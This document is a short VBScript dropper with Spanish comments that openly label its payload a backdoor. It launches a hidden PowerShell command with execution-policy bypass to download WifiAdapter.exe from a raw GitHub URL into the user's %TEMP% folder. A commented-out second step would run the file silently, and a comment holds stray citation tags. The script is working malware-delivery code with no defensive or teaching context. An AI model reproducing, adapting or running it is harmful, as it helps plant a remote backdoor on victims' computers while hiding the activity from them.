Set sh = CreateObject("WScript.Shell")
tempPath = sh.ExpandEnvironmentStrings("%TEMP%")

' 1) Descarga el backdoor
cmdDownload = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
              "'Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/WifiAdapter.exe"" " & _
              "-OutFile ""$env:TEMP\WifiAdapter.exe""'"


sh.Run cmdDownload, 0, True   'True = espera a que termine la descarga[web:32][web:51]

' 2) Ejecutar wifiAdapter.exe desde %TEMP%
' exePath = """" & tempPath & "\wifiAdapter.exe" & """"
' sh.Run exePath, 0, False      '0 = oculto, False = no espera a que termine
